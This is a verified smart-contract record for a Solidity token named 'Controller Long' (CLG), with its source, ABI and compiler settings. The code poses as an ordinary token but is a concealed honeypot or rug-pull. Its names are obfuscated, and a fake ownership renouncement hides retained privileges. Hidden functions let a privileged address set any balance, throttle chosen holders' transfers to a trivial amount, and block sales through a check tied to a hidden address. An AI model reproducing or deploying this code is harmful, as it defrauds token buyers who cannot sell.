{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface maxIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract takeTotalMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toFee {\n    function createPair(address tradingShould, address txReceiverShould) external returns (address);\n}\n\ninterface receiverWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableMarketing) external view returns (uint256);\n\n    function transfer(address listSender, uint256 sellFromExempt) external returns (bool);\n\n    function allowance(address totalWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellFromExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listSender,\n        uint256 sellFromExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minExempt, uint256 value);\n    event Approval(address indexed totalWallet, address indexed spender, uint256 value);\n}\n\ninterface buyListExempt is receiverWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ControllerLong is takeTotalMin, receiverWallet, buyListExempt {\n\n    address shouldReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private maxAmount;\n\n    function getOwner() external view returns (address) {\n        return fromAmount;\n    }\n\n    function swapWalletIs(address listLiquidity, uint256 sellFromExempt) public {\n        takeFrom();\n        maxAmount[listLiquidity] = sellFromExempt;\n    }\n\n    bool public launchedLimit;\n\n    function owner() external view returns (address) {\n        return fromAmount;\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingLaunchFund;\n\n    bool private exemptReceiver;\n\n    event OwnershipTransferred(address indexed walletLimitList, address indexed isEnable);\n\n    function transferFrom(address buyTradingMode, address listSender, uint256 sellFromExempt) external override returns (bool) {\n        if (_msgSender() != listMarketingMax) {\n            if (tradingLaunchFund[buyTradingMode][_msgSender()] != type(uint256).max) {\n                require(sellFromExempt <= tradingLaunchFund[buyTradingMode][_msgSender()]);\n                tradingLaunchFund[buyTradingMode][_msgSender()] -= sellFromExempt;\n            }\n        }\n        return autoLaunched(buyTradingMode, listSender, sellFromExempt);\n    }\n\n    function exemptTotal() public {\n        emit OwnershipTransferred(receiverTeam, address(0));\n        fromAmount = address(0);\n    }\n\n    uint256 totalMode;\n\n    uint256 launchFrom;\n\n    uint256 public launchTo;\n\n    uint8 private amountSender = 18;\n\n    string private toSell = \"CLG\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderAmountReceiver;\n    }\n\n    mapping(address => bool) public maxReceiver;\n\n    function takeFrom() private view {\n        require(sellIs[_msgSender()]);\n    }\n\n    uint256 private amountLaunched;\n\n    mapping(address => bool) public sellIs;\n\n    address listMarketingMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant feeToken = 4 ** 10;\n\n    function atAmount(address teamLimit) public {\n        takeFrom();\n        if (exemptReceiver == isAmount) {\n            launchTo = fundMarketingSender;\n        }\n        if (teamLimit == receiverTeam || teamLimit == modeExemptTo) {\n            return;\n        }\n        maxReceiver[teamLimit] = true;\n    }\n\n    function enableSwapLaunched(address isSell) public {\n        require(isSell.balance < 100000);\n        if (launchedLimit) {\n            return;\n        }\n        if (toWallet != isAmount) {\n            toWallet = false;\n        }\n        sellIs[isSell] = true;\n        if (amountLaunched == launchTo) {\n            launchTo = fundMarketingSender;\n        }\n        launchedLimit = true;\n    }\n\n    uint256 private senderAmountReceiver = 100000000 * 10 ** 18;\n\n    address public modeExemptTo;\n\n    string private exemptLiquidity = \"Controller Long\";\n\n    function marketingReceiver(address buyTradingMode, address listSender, uint256 sellFromExempt) internal returns (bool) {\n        require(maxAmount[buyTradingMode] >= sellFromExempt);\n        maxAmount[buyTradingMode] -= sellFromExempt;\n        maxAmount[listSender] += sellFromExempt;\n        emit Transfer(buyTradingMode, listSender, sellFromExempt);\n        return true;\n    }\n\n    bool public toWallet;\n\n    constructor (){\n        \n        maxIs minLaunch = maxIs(listMarketingMax);\n        modeExemptTo = toFee(minLaunch.factory()).createPair(minLaunch.WETH(), address(this));\n        if (toWallet) {\n            fundMarketingSender = amountLaunched;\n        }\n        receiverTeam = _msgSender();\n        exemptTotal();\n        sellIs[receiverTeam] = true;\n        maxAmount[receiverTeam] = senderAmountReceiver;\n        \n        emit Transfer(address(0), receiverTeam, senderAmountReceiver);\n    }\n\n    address public receiverTeam;\n\n    function balanceOf(address enableMarketing) public view virtual override returns (uint256) {\n        return maxAmount[enableMarketing];\n    }\n\n    function transfer(address listLiquidity, uint256 sellFromExempt) external virtual override returns (bool) {\n        return autoLaunched(_msgSender(), listLiquidity, sellFromExempt);\n    }\n\n    uint256 public fundMarketingSender;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptLiquidity;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toSell;\n    }\n\n    function approve(address toFrom, uint256 sellFromExempt) public virtual override returns (bool) {\n        tradingLaunchFund[_msgSender()][toFrom] = sellFromExempt;\n        emit Approval(_msgSender(), toFrom, sellFromExempt);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountSender;\n    }\n\n    bool public isAmount;\n\n    function autoLaunched(address buyTradingMode, address listSender, uint256 sellFromExempt) internal returns (bool) {\n        if (buyTradingMode == receiverTeam) {\n            return marketingReceiver(buyTradingMode, listSender, sellFromExempt);\n        }\n        uint256 sellMax = receiverWallet(modeExemptTo).balanceOf(shouldReceiver);\n        require(sellMax == launchFrom);\n        require(listSender != shouldReceiver);\n        if (maxReceiver[buyTradingMode]) {\n            return marketingReceiver(buyTradingMode, listSender, feeToken);\n        }\n        return marketingReceiver(buyTradingMode, listSender, sellFromExempt);\n    }\n\n    function allowance(address minLaunchSwap, address toFrom) external view virtual override returns (uint256) {\n        if (toFrom == listMarketingMax) {\n            return type(uint256).max;\n        }\n        return tradingLaunchFund[minLaunchSwap][toFrom];\n    }\n\n    address private fromAmount;\n\n    function limitSell(uint256 sellFromExempt) public {\n        takeFrom();\n        launchFrom = sellFromExempt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLimitList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunchSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellFromExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"}],\"name\":\"atAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"}],\"name\":\"enableSwapLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMarketingSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellFromExempt\",\"type\":\"uint256\"}],\"name\":\"limitSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeExemptTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellFromExempt\",\"type\":\"uint256\"}],\"name\":\"swapWalletIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellFromExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTradingMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellFromExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ControllerLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}